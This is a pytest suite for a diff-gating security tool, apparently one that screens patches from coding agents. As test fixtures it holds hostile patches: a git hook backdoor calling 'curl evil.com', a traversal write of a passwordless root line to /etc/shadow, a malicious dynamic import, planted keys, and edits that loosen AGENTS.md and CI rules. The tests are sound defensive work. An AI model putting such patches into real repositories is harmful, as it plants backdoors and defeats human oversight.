"""Empirical Challenger 1 Stress & Adversarial Test Suite.

Adversarially tests:
1. Public CLI Tooling (`agentpoi-sde`) entrypoints, subcommands, arguments, exit codes.
2. Unified Diff Parser (`diff_parser.py`) on corrupted, truncated, unicode, and malicious diffs.
3. Repository State Anchor (`repo_anchor.py`) on ignored dirs, nested structures, and hashing reproducibility.
4. Fail-closed security gating across policy tampering, secret leaks, and AST attacks via diffs.
"""

import json

import pytest

from agentpoi_sde.anchor.repo_anchor import RepositoryStateAnchor
from agentpoi_sde.cli import main
from agentpoi_sde.delta.diff_parser import (
    MalformedDiffError,
    parse_unified_diff,
)
from agentpoi_sde.domain import MutationOp

# ==============================================================================
# Helper to invoke CLI safely in-process and out-of-process
# ==============================================================================

def run_cli(args: list[str], capsys=None) -> tuple[int, str, str]:
    """Execute CLI in-process and return (exit_code, stdout, stderr)."""
    try:
        code = main(args)
    except SystemExit as exc:
        code = exc.code if isinstance(exc.code, int) else 0

    if capsys:
        captured = capsys.readouterr()
        return code, captured.out, captured.err
    return code, "", ""


# ==============================================================================
# Suite 1: Unified Diff Parser Stress & Edge Cases
# ==============================================================================

class TestDiffParserStress:
    """Adversarial boundary testing of parse_unified_diff."""

    def test_empty_and_whitespace_diffs(self):
        """Empty and whitespace strings should return empty list."""
        assert parse_unified_diff("") == []
        assert parse_unified_diff("   \n\t\r\n   ") == []
        assert parse_unified_diff("\n\n\n") == []

    def test_corrupted_hunk_header_missing_at_signs(self):
        """Hunk headers without proper @@ delimiters must raise MalformedDiffError/ValueError."""
        diff = "--- a/file.py\n+++ b/file.py\n@@ -1,2 +1,2\n-a\n+b\n"
        with pytest.raises((MalformedDiffError, ValueError)):
            parse_unified_diff(diff)

    def test_corrupted_hunk_header_non_numeric(self):
        """Hunk header with letters instead of numbers must fail-closed."""
        diff = "--- a/file.py\n+++ b/file.py\n@@ -foo,bar +baz,qux @@\n-a\n+b\n"
        with pytest.raises((MalformedDiffError, ValueError)):
            parse_unified_diff(diff)

    def test_missing_plus_header_after_minus(self):
        """Diff with '--- ' but missing '+++ ' must fail-closed."""
        diff = "--- a/file.py\n@@ -1,1 +1,1 @@\n-a\n+b\n"
        with pytest.raises((MalformedDiffError, ValueError)):
            parse_unified_diff(diff)

    def test_corrupt_hunk_body_line(self):
        """Hunk body line not starting with ' ', '+', or '-' must fail-closed."""
        diff = "--- a/file.py\n+++ b/file.py\n@@ -1,1 +1,1 @@\n?invalid_marker\n"
        with pytest.raises((MalformedDiffError, ValueError)):
            parse_unified_diff(diff)

    def test_corrupt_hunk_body_asterisk_marker(self):
        """Context diff format markers inside unified diff must fail-closed."""
        diff = "--- a/file.py\n+++ b/file.py\n@@ -1,1 +1,1 @@\n*** unexpected\n"
        with pytest.raises((MalformedDiffError, ValueError)):
            parse_unified_diff(diff)

    def test_header_without_hunks_handling(self):
        """Diff with header but no hunks: analyze behavior."""
        diff = "--- a/file.py\n+++ b/file.py\n"
        # If no hunks exist, what is returned?
        muts = parse_unified_diff(diff)
        # Note: if it returns a mutation, check its content
        if muts:
            assert muts[0].path == "file.py"

    def test_non_ascii_utf8_multibyte(self):
        """Diff containing multi-byte UTF-8, emojis, CJK, and Cyrillic."""
        diff = (
            "--- a/unicode.txt\n"
            "+++ b/unicode.txt\n"
            "@@ -1,1 +1,2 @@\n"
            " standard\n"
            "+你好世界 🌍 Привет мир \U0001F680\n"
        )
        muts = parse_unified_diff(diff, base_files={"unicode.txt": "standard\n"})
        assert len(muts) == 1
        assert "你好世界 🌍 Привет мир \U0001F680" in muts[0].new_content

    def test_bom_encoded_diff(self):
        """Diff starting with UTF-8 BOM must be tolerated or fail-closed cleanly."""
        bom_diff = "\ufeff--- a/bom.py\n+++ b/bom.py\n@@ -0,0 +1,1 @@\n+x = 1\n"
        # If BOM is not stripped by parser, does it raise MalformedDiffError or parse?
        try:
            muts = parse_unified_diff(bom_diff)
            assert len(muts) == 1
        except (MalformedDiffError, ValueError):
            pass  # Fails closed cleanly

    def test_multiple_files_mixed_operations(self):
        """Single patch creating, modifying, and deleting files simultaneously."""
        diff = (
            "--- /dev/null\n"
            "+++ b/created.py\n"
            "@@ -0,0 +1,1 @@\n"
            "+created = True\n"
            "--- a/modified.py\n"
            "+++ b/modified.py\n"
            "@@ -1,1 +1,2 @@\n"
            " base\n"
            "+mod = True\n"
            "--- a/deleted.py\n"
            "+++ /dev/null\n"
            "@@ -1,1 +0,0 @@\n"
            "-old\n"
        )
        base = {"modified.py": "base\n", "deleted.py": "old\n"}
        muts = parse_unified_diff(diff, base_files=base)
        assert len(muts) == 3
        ops = {m.path: m.op for m in muts}
        assert ops["created.py"] == MutationOp.CREATE
        assert ops["modified.py"] == MutationOp.MODIFY
        assert ops["deleted.py"] == MutationOp.DELETE

    def test_directory_traversal_paths_cleaned(self):
        """Path cleaning handles relative prefixes."""
        diff = "--- a/sub/../file.py\n+++ b/sub/../file.py\n@@ -0,0 +1 @@\n+x = 1\n"
        muts = parse_unified_diff(diff)
        assert len(muts) == 1
        assert "sub/../file.py" in muts[0].path or "file.py" in muts[0].path


# ==============================================================================
# Suite 2: CLI check-diff Invariant & Boundary Tests
# ==============================================================================

class TestCliCheckDiffStress:
    """Adversarial testing of 'agentpoi-sde check-diff' command."""

    def test_check_diff_clean_patch_exits_0(self, tmp_path, capsys):
        """Benign modification to non-protected source exits 0 with APPROVED."""
        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / "calc.py").write_text("def add(a, b):\n    return a + b\n", encoding="utf-8")

        patch = tmp_path / "clean.patch"
        patch.write_text(
            "--- a/calc.py\n+++ b/calc.py\n@@ -1,2 +1,3 @@\n def add(a, b):\n+    # helper\n     return a + b\n",
            encoding="utf-8",
        )
        code, out, _ = run_cli(["check-diff", str(patch), "--repo", str(repo)], capsys)
        assert code == 0
        assert "APPROVED" in out

    def test_check_diff_empty_patch_exits_0(self, tmp_path, capsys):
        """Empty patch exits 0 with APPROVED and 0 mutations."""
        patch = tmp_path / "empty.patch"
        patch.write_text("", encoding="utf-8")
        code, out, _ = run_cli(["check-diff", str(patch)], capsys)
        assert code == 0
        assert "APPROVED" in out

    def test_check_diff_policy_tampering_ci_workflow_exits_1(self, tmp_path, capsys):
        """Attempt to modify .github/workflows/ci.yml must exit 1 (BLOCKED, I1)."""
        repo = tmp_path / "repo"
        repo.mkdir()
        wf_dir = repo / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("name: CI\njobs:\n  test:\n    run: pytest\n", encoding="utf-8")

        patch = tmp_path / "tamper_ci.patch"
        patch.write_text(
            "--- a/.github/workflows/ci.yml\n"
            "+++ b/.github/workflows/ci.yml\n"
            "@@ -1,3 +1,3 @@\n"
            " name: CI\n"
            " jobs:\n"
            "-  test:\n"
            "+  skip:\n",
            encoding="utf-8",
        )
        code, out, _ = run_cli(["check-diff", str(patch), "--repo", str(repo)], capsys)
        assert code == 1
        assert "BLOCKED" in out
        assert "I1" in out

    def test_check_diff_policy_tampering_agents_md_exits_1(self, tmp_path, capsys):
        """Attempt to modify AGENTS.md must exit 1 (BLOCKED, I1)."""
        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / "AGENTS.md").write_text("# Rules\n- strict\n", encoding="utf-8")

        patch = tmp_path / "tamper_agents.patch"
        patch.write_text(
            "--- a/AGENTS.md\n"
            "+++ b/AGENTS.md\n"
            "@@ -1,2 +1,2 @@\n"
            " # Rules\n"
            "-- strict\n"
            "+- permissive\n",
            encoding="utf-8",
        )
        code, out, _ = run_cli(["check-diff", str(patch), "--repo", str(repo)], capsys)
        assert code == 1
        assert "BLOCKED" in out
        assert "I1" in out

    def test_check_diff_secret_leak_aws_key_exits_1(self, tmp_path, capsys):
        """Introducing AWS access key in diff must exit 1 (BLOCKED, I3)."""
        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / "service.py").write_text("def run(): pass\n", encoding="utf-8")

        patch = tmp_path / "leak_aws.patch"
        patch.write_text(
            "--- a/service.py\n"
            "+++ b/service.py\n"
            "@@ -1 +1,2 @@\n"
            " def run(): pass\n"
            '+KEY = "AKIAIOSFODNN7EXAMPLE"\n',
            encoding="utf-8",
        )
        code, out, _ = run_cli(["check-diff", str(patch), "--repo", str(repo)], capsys)
        assert code == 1
        assert "BLOCKED" in out
        assert "I3" in out

    def test_check_diff_secret_leak_deploy_api_key_exits_1(self, tmp_path, capsys):
        """Introducing DEPLOY_API_KEY with underscore must exit 1 (Rule 8 compliance)."""
        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / "config.py").write_text("DEBUG = True\n", encoding="utf-8")

        patch = tmp_path / "leak_deploy.patch"
        patch.write_text(
            "--- a/config.py\n"
            "+++ b/config.py\n"
            "@@ -1 +1,2 @@\n"
            " DEBUG = True\n"
            '+DEPLOY_API_KEY = "super_secret_deployment_token_12345"\n',
            encoding="utf-8",
        )
        code, out, _ = run_cli(["check-diff", str(patch), "--repo", str(repo)], capsys)
        assert code == 1
        assert "BLOCKED" in out
        assert "I3" in out

    def test_check_diff_dynamic_import_evasion_exits_1(self, tmp_path, capsys):
        """Attempt to add dynamic import of unverified dependency exits 1 (I6/I4)."""
        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / "calc.py").write_text("def calc(): return 1\n", encoding="utf-8")

        patch = tmp_path / "dyn_imp.patch"
        patch.write_text(
            "--- a/calc.py\n"
            "+++ b/calc.py\n"
            "@@ -1 +1,2 @@\n"
            " def calc(): return 1\n"
            "+mod = __import__('unverified_malicious_package')\n",
            encoding="utf-8",
        )
        code, out, _ = run_cli(["check-diff", str(patch), "--repo", str(repo)], capsys)
        assert code == 1
        assert "BLOCKED" in out

    def test_check_diff_syntax_error_exits_1_i7(self, tmp_path, capsys):
        """Diff introducing Python SyntaxError must fail-closed under I7 with exit code 1."""
        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / "bad_syntax.py").write_text("def ok(): pass\n", encoding="utf-8")

        patch = tmp_path / "syntax_err.patch"
        patch.write_text(
            "--- a/bad_syntax.py\n"
            "+++ b/bad_syntax.py\n"
            "@@ -1 +1,2 @@\n"
            " def ok(): pass\n"
            "+def broken_syntax(:\n",
            encoding="utf-8",
        )
        code, out, _ = run_cli(["check-diff", str(patch), "--repo", str(repo)], capsys)
        assert code == 1
        assert "BLOCKED" in out
        assert "I7" in out

    def test_check_diff_malformed_diff_syntax_exits_2(self, tmp_path, capsys):
        """Corrupt patch syntax must fail closed with exit code 2."""
        patch = tmp_path / "corrupt.patch"
        patch.write_text("--- a/foo.py\n+++ b/foo.py\n@@ corrupt @@\n", encoding="utf-8")

        code, _, err = run_cli(["check-diff", str(patch)], capsys)
        assert code == 2
        assert "malformed" in err.lower() or "error" in err.lower()

    def test_check_diff_nonexistent_patch_file_exits_2(self, capsys):
        """Nonexistent patch file exits with code 2."""
        code, _, err = run_cli(["check-diff", "nonexistent_file_xyz_123.patch"], capsys)
        assert code == 2
        assert "does not exist" in err.lower()

    def test_check_diff_nonexistent_repo_exits_2(self, tmp_path, capsys):
        """Nonexistent repo directory exits with code 2."""
        patch = tmp_path / "dummy.patch"
        patch.write_text("", encoding="utf-8")
        code, _, err = run_cli(["check-diff", str(patch), "--repo", "nonexistent_repo_xyz_999"], capsys)
        assert code == 2
        assert "does not exist" in err.lower()

    def test_check_diff_multi_file_partial_tamper_fails_closed(self, tmp_path, capsys):
        """Patch with 1 benign file and 1 policy tampering file must fail closed overall."""
        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / "clean.py").write_text("a = 1\n", encoding="utf-8")
        (repo / "AGENTS.md").write_text("# Rules\n", encoding="utf-8")

        patch = tmp_path / "mixed.patch"
        patch.write_text(
            "--- a/clean.py\n"
            "+++ b/clean.py\n"
            "@@ -1 +1,2 @@\n"
            " a = 1\n"
            "+b = 2\n"
            "--- a/AGENTS.md\n"
            "+++ b/AGENTS.md\n"
            "@@ -1 +1,2 @@\n"
            " # Rules\n"
            "+# Tampered\n",
            encoding="utf-8",
        )
        code, out, _ = run_cli(["check-diff", str(patch), "--repo", str(repo)], capsys)
        assert code == 1
        assert "BLOCKED" in out
        assert "I1" in out

    def test_check_diff_json_mode_schema(self, tmp_path, capsys):
        """JSON output mode produces valid structured schema."""
        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / "app.py").write_text("x = 1\n", encoding="utf-8")

        patch = tmp_path / "test.patch"
        patch.write_text("--- a/app.py\n+++ b/app.py\n@@ -1 +1,2 @@\n x = 1\n+y = 2\n", encoding="utf-8")

        code, out, _ = run_cli(["check-diff", str(patch), "--repo", str(repo), "--json"], capsys)
        assert code == 0
        data = json.loads(out)
        assert data["verdict"] == "APPROVED"
        assert "mutations" in data
        assert "violations" in data


# ==============================================================================
# Suite 3: Repository State Anchor (R0) Stress & Consistency
# ==============================================================================

class TestRepoAnchorStress:
    """Adversarial stress testing of RepositoryStateAnchor."""

    def test_anchor_deterministic_sha256_tree_oid(self, tmp_path):
        """Repeated invocations on unchanged repository yield bit-identical tree OIDs."""
        proj = tmp_path / "proj"
        proj.mkdir()
        (proj / "a.py").write_text("def a(): return 1\n", encoding="utf-8")
        (proj / "b.py").write_text("def b(): return 2\n", encoding="utf-8")

        anchor1 = RepositoryStateAnchor.from_directory(str(proj))
        anchor2 = RepositoryStateAnchor.from_directory(str(proj))
        assert anchor1.tree_oid() == anchor2.tree_oid()
        assert len(anchor1.tree_oid()) == 64

    def test_anchor_quarantined_dirs_ignored(self, tmp_path):
        """Mutations inside .git, .venv, .agents, node_modules must NOT alter tree OID."""
        proj = tmp_path / "proj"
        proj.mkdir()
        (proj / "src").mkdir()
        (proj / "src" / "code.py").write_text("val = 42\n", encoding="utf-8")

        anchor_clean = RepositoryStateAnchor.from_directory(str(proj))
        clean_oid = anchor_clean.tree_oid()

        # Add quarantined directories with contents
        (proj / ".git").mkdir()
        (proj / ".git" / "HEAD").write_text("ref: refs/heads/main\n", encoding="utf-8")

        (proj / ".venv").mkdir()
        (proj / ".venv" / "pyvenv.cfg").write_text("home = /usr/bin\n", encoding="utf-8")

        (proj / ".agents").mkdir()
        (proj / ".agents" / "teamwork").mkdir()
        (proj / ".agents" / "teamwork" / "plan.md").write_text("untracked metadata\n", encoding="utf-8")

        (proj / "node_modules").mkdir()
        (proj / "node_modules" / "pkg").mkdir()
        (proj / "node_modules" / "pkg" / "index.js").write_text("console.log(1);\n", encoding="utf-8")

        (proj / "__pycache__").mkdir()
        (proj / "__pycache__" / "code.cpython-312.pyc").write_text("bytecode\n", encoding="utf-8")

        anchor_dirty = RepositoryStateAnchor.from_directory(str(proj))
        dirty_oid = anchor_dirty.tree_oid()

        # SHA-256 tree OID MUST remain bit-identical despite dirty quarantined dirs
        assert dirty_oid == clean_oid
        assert len(anchor_dirty.files) == 1
        assert "src/code.py" in anchor_dirty.files
        assert not any(p.startswith(".git") for p in anchor_dirty.files)
        assert not any(p.startswith(".venv") for p in anchor_dirty.files)
        assert not any(p.startswith(".agents") for p in anchor_dirty.files)

    def test_anchor_non_ascii_unicode_file_content(self, tmp_path):
        """Files containing multibyte UTF-8 produce consistent hash."""
        proj = tmp_path / "proj"
        proj.mkdir()
        (proj / "unicode.py").write_text("# 🚀 Привет, мир! 日本語\nx = '✓'\n", encoding="utf-8")

        anchor = RepositoryStateAnchor.from_directory(str(proj))
        assert "unicode.py" in anchor.files
        h = anchor.file_hash("unicode.py")
        assert len(h) == 64
        # Tree OID should also be valid SHA-256
        assert len(anchor.tree_oid()) == 64

    def test_anchor_windows_path_normalization(self, tmp_path):
        """All indexed paths must use POSIX forward slash '/' regardless of OS."""
        proj = tmp_path / "proj"
        proj.mkdir()
        sub = proj / "deep" / "nested" / "pkg"
        sub.mkdir(parents=True)
        (sub / "mod.py").write_text("val = 1\n", encoding="utf-8")

        anchor = RepositoryStateAnchor.from_directory(str(proj))
        assert "deep/nested/pkg/mod.py" in anchor.files
        for path in anchor.files:
            assert "\\" not in path, f"Found Windows backslash in anchor path: {path}"

    def test_cli_anchor_manifest_flag(self, tmp_path, capsys):
        """CLI 'anchor --manifest' outputs sorted file manifest."""
        proj = tmp_path / "proj"
        proj.mkdir()
        (proj / "f1.py").write_text("1", encoding="utf-8")
        (proj / "f2.py").write_text("2", encoding="utf-8")

        code, out, _ = run_cli(["anchor", str(proj), "--manifest"], capsys)
        assert code == 0
        assert "File Manifest" in out
        assert "f1.py" in out
        assert "f2.py" in out


# ==============================================================================
# Suite 4: Empirical Vulnerability Reproductions
# ==============================================================================

class TestEmpiricalVulnerabilities:
    """Empirical reproductions of security failure modes discovered by Challenger 1."""

    def test_reproduce_path_traversal_escape_approved(self, tmp_path, capsys):
        """Verify that check-diff blocks directory traversal escaping repo root fail-closed."""
        repo = tmp_path / "repo"
        repo.mkdir()
        patch = tmp_path / "escape.patch"
        patch.write_text(
            "--- /dev/null\n+++ b/../../etc/shadow\n@@ -0,0 +1 @@\n+root::0:0:::\n",
            encoding="utf-8",
        )
        code, out, _ = run_cli(["check-diff", str(patch), "--repo", str(repo)], capsys)
        assert code == 1
        assert "BLOCKED" in out

    def test_reproduce_git_hook_tampering_approved(self, tmp_path, capsys):
        """Verify that check-diff blocks backdoor injection into .git/hooks fail-closed."""
        repo = tmp_path / "repo"
        repo.mkdir()
        patch = tmp_path / "hook.patch"
        patch.write_text(
            "--- /dev/null\n+++ b/.git/hooks/pre-commit\n@@ -0,0 +1,2 @@\n+#!/bin/sh\n+curl evil.com\n",
            encoding="utf-8",
        )
        code, out, _ = run_cli(["check-diff", str(patch), "--repo", str(repo)], capsys)
        assert code == 1
        assert "BLOCKED" in out

    def test_reproduce_truncated_diff_produces_wipe_mutation(self):
        """Verify that truncated diff without hunks returns empty mutations fail-closed."""
        truncated = "--- a/critical.py\n+++ b/critical.py\n"
        muts = parse_unified_diff(truncated)
        assert muts == []
